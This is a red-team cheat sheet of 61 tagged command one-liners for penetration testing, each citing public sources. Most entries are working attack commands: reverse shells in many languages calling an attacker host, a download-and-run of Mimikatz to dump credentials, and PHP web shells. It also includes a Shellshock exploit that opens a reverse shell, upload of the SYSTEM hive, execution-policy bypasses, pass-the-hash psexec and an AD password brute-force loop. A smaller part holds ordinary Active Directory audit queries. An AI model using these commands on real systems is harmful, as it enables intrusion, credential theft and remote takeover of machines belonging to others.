### 1. bash reverse shell
```
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```
**- linux,bash,reverse shells**
#### References:

https://highon.coffee/blog/reverse-shell-cheat-sheet/
__________
### 2. perl reverse shell
```
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
**- linux,reverse shells,Windows,perl**
#### References:

https://highon.coffee/blog/reverse-shell-cheat-sheet/
__________
### 3. python reverse shell
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
**- linux,reverse shells,Windows,python**
#### References:

https://highon.coffee/blog/reverse-shell-cheat-sheet/
__________
### 4. php reverse shell : php from the CLI
```
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```
**- linux,reverse shells,Windows,php**
#### References:

https://highon.coffee/blog/reverse-shell-cheat-sheet/
__________
### 5. ruby reverse shell
```
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```
**- linux,reverse shells,Windows,ruby**
#### References:

https://highon.coffee/blog/reverse-shell-cheat-sheet/
__________
### 6. net cat reverse shell
```
nc -e /bin/sh 10.0.0.1 1234
```
**- linux,reverse shells,Windows**
#### References:

https://highon.coffee/blog/reverse-shell-cheat-sheet/
__________
### 7. enable xp_cmdshell
```
exec sp_configure 'xp_cmdshell', 1 go reconfigure
```
**- web application,sql injection,shell,mssql**
#### References:

http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
__________
### 8. powershell bypass block
```
Set-ExecutionPolicy unrestricted
```
**- Windows,powershell**
#### References:

https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/
__________
### 9. powershell bypass block
```
powershell.exe -noprofile -executionpolicy bypass
```
**- Windows,powershell**
#### References:

https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/
__________
### 10. Invoke mimicatz, can use with psexec for pwnage
```
powershell "IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/1qMn59d'); Invoke-Mimikatz -DumpCreds"
```
**- passwords,Windows,av evasion,powershell**
#### References:

http://carnal0wnage.attackresearch.com/2013/10/dumping-domains-worth-of-passwords-with.html
https://github.com/clymb3r/PowerShell/tree/master/Invoke-Mimikatz
__________
### 11. Powershell password last changed, run on DC
```
Get-ADUser -filter * -properties * | sort-object passwordlastset | select-object samaccountname, passwordlastset, passwordneverexpires, homedirectory, mail, enabled | Export-csv -path c:\temp\pwprofile.csv
```
**- enumeration,user information,Windows,powershell**
#### References:

https://yg.ht
https://www.reddit.com/r/sysadmin/comments/3y0pad/some_ad_checks_you_should_be_running_on_a_regular/
__________
### 12. loop around and open cmd, Psexecy.py != psexec msf != sysinternals psexec
```
for host in $(cat hosts.txt); do psexec.py [DOM]/[USER]:'[PASS]'@$host "cmd.exe"; done
```
**- linux,loop,impacket,remote command shell**
#### References:

https://yg.ht
https://www.coresecurity.com/corelabs-research/open-source-tools/impacket
__________
### 13. PSExec with hashses
```
psexec.py -hashes [LM]:[NTLM] [DOM]/[USER]@[TARGET] "cmd.exe"
```
**- linux,impacket,remote command shell,hashes**
#### References:

https://www.coresecurity.com/corelabs-research/open-source-tools/impacket
__________
### 14. bash reverse shell using a file handle '5'
```
exec 5<>/dev/tcp/[me]/[port]; while read line 0<&5; do $line 2>&5 >&5; done
```
**- linux,bash,reverse shells**
#### References:

https://highon.coffee/blog/reverse-shell-cheat-sheet/
__________
### 15. telnet reverse shell
```
rm -f /tmp/p; mknod /tmp/p p && nc [me] [port] 0/tmp/p
```
**- linux,bash,reverse shells**
#### References:

https://highon.coffee/blog/reverse-shell-cheat-sheet/
__________
### 16. telnet reverse shell
```
telnet [me] [port]| /bin/bash | telnet [me] [lport]
```
**- linux,bash,reverse shells**
#### References:

https://highon.coffee/blog/reverse-shell-cheat-sheet/
__________
### 17. perl windows reverse shell
```
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"[me]:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
**- reverse shells,Windows,perl**
#### References:

https://highon.coffee/blog/reverse-shell-cheat-sheet/
__________
### 18. Java reverse shell - replace ; with newline
```
r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]); p.waitFor()
```
**- linux,reverse shells,java**
#### References:

https://highon.coffee/blog/reverse-shell-cheat-sheet/
__________
### 19. windows psexec : \\127.0.0.1\c$\cmd.exe -p can be pass OR hash
```
psexec /accepteula \\[victim] -u [domain]\[user] -p [password] -c -f \\[victim]\[share\[file]
```
**- pivoting,Windows,remote command shell**
#### References:

https://technet.microsoft.com/en-us/sysinternals/pxexec.aspx
__________
### 20. execute command on remote host from remote smb share
```
wmic /node:[victim] /user:[domain]\[user] /password:[password] process call create "\\[host]\[share]\[exe]"
```
**- smb,Windows,remote command shell**
#### References:

https://technet.microsoft.com/en-us/library/cc754534(v=ws.11).aspx
https://blogs.technet.microsoft.com/askperf/2012/02/17/useful-wmic-queries/
__________
### 21. powershell wget
```
invoke-webrequest
```
**- files,Windows,powershell**
#### References:

https://msdn.microsoft.com/powershell/reference/5.1/microsoft.powershell.utility/Invoke-WebRequest
__________
### 22. also powershell wget
```
wget
```
**- files,Windows,powershell**
#### References:

https://msdn.microsoft.com/powershell/reference/5.1/microsoft.powershell.utility/Invoke-WebRequest
__________
### 23. also powershell wget
```
(new-object system.net.webclient).downloadFile("[url]","[dest]")
```
**- files,Windows,powershell**
#### References:

https://msdn.microsoft.com/powershell/reference/5.1/microsoft.powershell.utility/Invoke-WebRequest
__________
### 24. powershell type file
```
get-content
```
**- files,Windows,powershell**
#### References:

https://msdn.microsoft.com/en-us/powershell/reference/5.0/microsoft.powershell.management/get-content
__________
### 25. powershell services
```
get-service
```
**- Windows,powershell,process management**
#### References:

https://msdn.microsoft.com/en-us/powershell/reference/5.1/microsoft.powershell.management/get-service
__________
### 26. list of drives : cd Env:\ . . . mind . . . blown
```
get-psdrive
```
**- enumeration,interesting,Windows,configuration,powershell**
#### References:

https://msdn.microsoft.com/en-us/powershell/reference/5.0/microsoft.powershell.management/get-psdrive
__________
### 27. RTFM *cough*
```
get-help
```
**- Windows,powershell**
#### References:

https://technet.microsoft.com/en-us/library/ee176848.aspx
__________
### 28. list interfaces with wmi
```
get-wmiobject -list 'netework'
```
**- Windows,powershell**
#### References:

https://technet.microsoft.com/en-us/library/ee176860.aspx
https://msdn.microsoft.com/en-us/powershell/reference/5.1/microsoft.powershell.management/get-wmiobject
__________
### 29. get dns addr tab after :: for more choices
```
[Net.DNS]::GetHostEntry("ip")
```
**- dns,Windows,powershell**
#### References:

https://msdn.microsoft.com/en-us/library/ms143998(v=vs.110).aspx
__________
### 30. get system information
```
Get-WmiObject -class win32 operatingsystem | select -property * | exportcsv c:\temp\os.txt
```
**- enumeration,Windows,powershell**
#### References:

http://www.energizedtech.com/2010/03/powershell-check-your-windows.html
__________
### 31. powershell mount remote share : think sysinternals remote share
```
New-PSDrive -Persist -PSProvider FileSjstem -Root \\[ip]\tools -Name i
```
**- files,smb,Windows,powershell**
#### References:

https://msdn.microsoft.com/en-us/powershell/reference/5.1/microsoft.powershell.management/new-psdrive
__________
### 32. txt files changed after the 13 Jan 2017
```
Get-ChildItem -Path c:\ -Force -Recurse -Filter *.txt -ErrorAction SilentlyContinue | where {$_.LastWriteTime -gt "2017-01-13"}
```
**- files,Windows,powershell,forensics**
#### References:

https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
__________
### 33. powershell port scanning
```
$ports=([ports]);$ip=[ip];foreach ($port in $ports){try{$socket=New-Object System.Net.Sockets.TCPClient($ip,$port);}catch{}; if $socket -eq $NULL {echo $ip ": "$port" : Closed";}else{echo $ip ": "$port" : Open";}$socket = $NULL;}}
```
**- networking,loop,interesting,scanning,Windows,powershell**
#### References:

https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
__________
### 34. Ping ip with timeout of 500
```
$ping = New-Object System.Net.Networkinformation.ping;$ping.Send("[ip]",50O);
```
**- networking,Windows,powershell**
#### References:

https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
__________
### 35. Ask user for credentials
```
powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass $Host.UI.PromptForCredential("[title]","[message]","[user]","[domain]")
```
**- passwords,Windows,powershell**
#### References:

https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
__________
### 36. powershell run on schedule, match says when run
```
powershell.exe -Command "do {if ((Get-Date -format yyyymmdd-HHmm) -match '201308(0[8-9]|1[0-1])|0[8-9]|1[0-7])[0-5][0-9]'){Start-Process -WindowStyle Hidden "[exe]";Start-Sleep -s 14400}}while(1)"
```
**- Windows,powershell**
#### References:

https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
__________
### 37. Powershell send an email
```
powershell.exe Send-MailMessage -to "[victim]" -from "[from]" -subject "[subject]" -a "[Attach file path]" -body "[Body]" -SmtpServer [ServerIP]
```
**- interesting,Windows,powershell**
#### References:

https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
__________
### 38. list hostname and ip for domain pc's
```
Get-WmiObject -ComputerName [DC] -Namesapce root\microsoftDNS -class MicrosoftDNS_ResourceRecord -Filter "domainname='[domain]' | select textrepresentation
```
**- enumeration,dns,Windows,powershell**
#### References:

https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
__________
### 39. Powershell upload file VIA post, script must write this out
```
powershell.exe -noprofile -noninteractive -command "[System.Net.ServicePointManager]::ServerCertificateValidationCallback{$true}$server="[$ip]/[script]";$filepath="c:/temp/SYSTEM";$http = new-object System.Net.Webclient; $response = $http.uploadFile($server,$filepath);"
```
**- networking,files,interesting,Windows,powershell**
#### References:

https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
__________
### 40. powershell shell
```
msfvenom -p Windows/meterpreter/reverse_https -f psh -a x86 LHOST=[lhost] LPORT=[lport] audit.ps1
```
**- metasploit,av evasion,powershell**
#### References:

https://www.offensive-security.com/metasploit-unleashed/msfvenom/
__________
### 41. Simple powershell brute force, user input list, checks the password 'password'
```
Function Test-ADAuthentication {param($username,$password);echo "$username $password";(new-object directoryservices.directoryentry"",$username,$password).psbase.name -ne $null}; forEach ($userName in Get-Content "user_logins.txt"){Test-ADAuthentication $userName password >> test4.txt;}
```
**- loop,brute,Windows,powershell**
#### References:

https://msdn.microsoft.com/en-us/library/system.directoryservices.directoryentry(v=vs.110).aspx
http://serverfault.com/questions/596602/powershell-test-user-credentials-in-ad-with-password-reset
__________
### 42. Bypass auth on ios 11.2-12.2
```
http://[ip]/level/56/exec/show/config
```
**- cisco,interesting,web application,remote command shell**
#### References:

https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
__________
### 43. perl spawn bash
```
perl -e 'exec "/bin/bash";'
```
**- perl,shell,privilege escalation**
#### References:

https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/
__________
### 44. python spawn bash
```
python -c 'import pty;pty.spawn("/bin/bash")'
```
**- python,shell,privilege escalation**
#### References:

https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/
__________
### 45. Call a shell from a number of programs, VIM, Nmap FTP SFTP etc
```
!bash
```
**- linux,shell,privilege escalation**
#### References:

https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/
__________
### 46. Check for accounts that don't have password expiry set
```
Get-ADUser -Filter 'useraccountcontrol -band 65536' -Properties useraccountcontrol | export-csv U-DONT_EXPIRE_PASSWORD.csv
```
**- enumeration,user information,Windows,powershell**
#### References:

https://www.reddit.com/r/sysadmin/comments/3y0pad/some_ad_checks_you_should_be_running_on_a_regular/
__________
### 47. Check for accounts that have no password requirement
```
Get-ADUser -Filter 'useraccountcontrol -band 32' -Properties useraccountcontrol | export-csv U-PASSWD_NOTREQD.csv
```
**- enumeration,user information,Windows,powershell**
#### References:

https://www.reddit.com/r/sysadmin/comments/3y0pad/some_ad_checks_you_should_be_running_on_a_regular/
__________
### 48. Accounts that have the password stored in a reversibly encrypted format
```
Get-ADUser -Filter 'useraccountcontrol -band 128' -Properties useraccountcontrol | export-csv U-ENCRYPTED_TEXT_PWD_ALLOWED.csv
```
**- enumeration,user information,Windows,powershell**
#### References:

https://www.reddit.com/r/sysadmin/comments/3y0pad/some_ad_checks_you_should_be_running_on_a_regular/
__________
### 49. List users that are trusted for Kerberos delegation
```
Get-ADUser -Filter 'useraccountcontrol -band 524288' -Properties useraccountcontrol | export-csv U-TRUSTED_FOR_DELEGATION.csv
```
**- enumeration,user information,Windows,powershell**
#### References:

https://www.reddit.com/r/sysadmin/comments/3y0pad/some_ad_checks_you_should_be_running_on_a_regular/
https://www.coresecurity.com/blog/kerberos-delegation-spns-and-more
https://labs.mwrinfosecurity.com/blog/trust-years-to-earn-seconds-to-break/
http://www.harmj0y.net/blog/activedirectory/the-most-dangerous-user-right-you-probably-have-never-heard-of/
__________
### 50. List accounts that don't require pre-authentication
```
Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol | export-csv U-DONT_REQUIRE_PREAUTH.csv
```
**- enumeration,user information,Windows,powershell**
#### References:

https://www.reddit.com/r/sysadmin/comments/3y0pad/some_ad_checks_you_should_be_running_on_a_regular/
__________
### 51. List accounts that have credentials encrypted with DES
```
Get-ADUser -Filter 'useraccountcontrol -band 2097152' -Properties useraccountcontrol | export-csv U-USE_DES_KEY_ONLY.csv
```
**- enumeration,user information,Windows,powershell**
#### References:

https://www.reddit.com/r/sysadmin/comments/3y0pad/some_ad_checks_you_should_be_running_on_a_regular/
__________
### 52. Php Simple shell, set aPasswordto access, cmd is your command: See Commix to use this easily
```
<?php if (isset($_GET['Password'])){passthru($_GET['cmd']);} ?>
```
**- web application,php,remote command shell**
#### References:

php.net/manual/en/function.passthru.php
__________
### 53. Php Simple shell, set Password to access, cmd is your command: See Commix to use this easily
```
<?php if (isset($_GET['Password'])){exec($_GET['cmd']);} ?>
```
**- web application,php,remote command shell**
#### References:

php.net/manual/en/function.exec.php
__________
### 54. Php Simple shell, set Password to access, cmd is your command: See Commix to use this easily
```
<?php if (isset($_GET['Password'])){system($_GET['cmd']);} ?>
```
**- web application,php,remote command shell**
#### References:

php.net/manual/en/function.system.php
__________
### 55. Php Simple shell, set Password to access, cmd is your command: See Commix to use this easily
```
<?php if (isset($_GET['Password'])){eval($_GET['cmd']);} ?>
```
**- web application,php,remote command shell**
#### References:

php.net/manual/en/function.eval.php
__________
### 56. Php Simple shell, set Password to access, bis your command: See Commix to use this easily
```
<?php if (isset($_GET['Password'])){shell_exec($_GET['cmd']);} ?>
```
**- web application,php,remote command shell**
#### References:

php.net/manual/en/function.shell-exec.php
__________
### 57. Hadoop Command execution, of course replace the shell with whatever you want
```
./bin/hadoop jar share/hadoop/tools/lib/hadoop-streaming-2.7.3.jar -input /tmp/out/1 -output /tmp/out/NC_1 -mapper "bash -i >& /dev/tcp/[ip]/[port] 0>&1" -reducer NONE -cmdenv user.name=hdfs -cmdenv as=hdfs -verbose -mapdebug "bash -i >& /dev/tcp/[ip]/[port] 0>&1"
```
**- reverse shells**
#### References:

http://seclist.us/hadoop-attack-library-is-a-collection-of-pentest-tools-and-resources-targeting-hadoop-environments.html
__________
### 58. Socat BindShell, First on server, second on client
```
socat TCP-LISTEN:[lip],reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane; socat FILE:`tty`,raw,echo=0 TCP:[rip]:[rport]
```
**- linux,pivoting,shells**
#### References:

https://artkond.com/2017/03/23/pivoting-guide/
__________
### 59. Socat reverse shell, First on client, second on server
```
socat TCP-LISTEN:[lip],reuseaddr FILE:`tty`,raw,echo=0; socat TCP4:[rip]:[rport] EXEC:bash,pty,stderr,setsid,sigint,sane
```
**- linux,pivoting,reverse shells**
#### References:

https://artkond.com/2017/03/23/pivoting-guide/
__________
### 60. Commix abuse exec as per the php shells, nicer than burp repeater! 
```
/opt/commix/commix.py -u "https://[rip]:443/[resource]?[password]&cmd=1*" --force-ssl
```
**- web application,remote command shell**
#### References:

https://github.com/commixproject/commix
__________
### 61. Exploit shellshock via curl, use -k switch to force curl to bypass any SSL warnings. Replace the bash command with anything.
```
curl http://192.168.123.123/path/to/cgi- bin/name_of_vuln_cgi -H "custom:() { ignored; }; /bin/bash -i >& /dev/tcp/[LHOST]/[LPORT] 0>&1 "
```
**- shellshock,curl**
#### References:

https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
__________
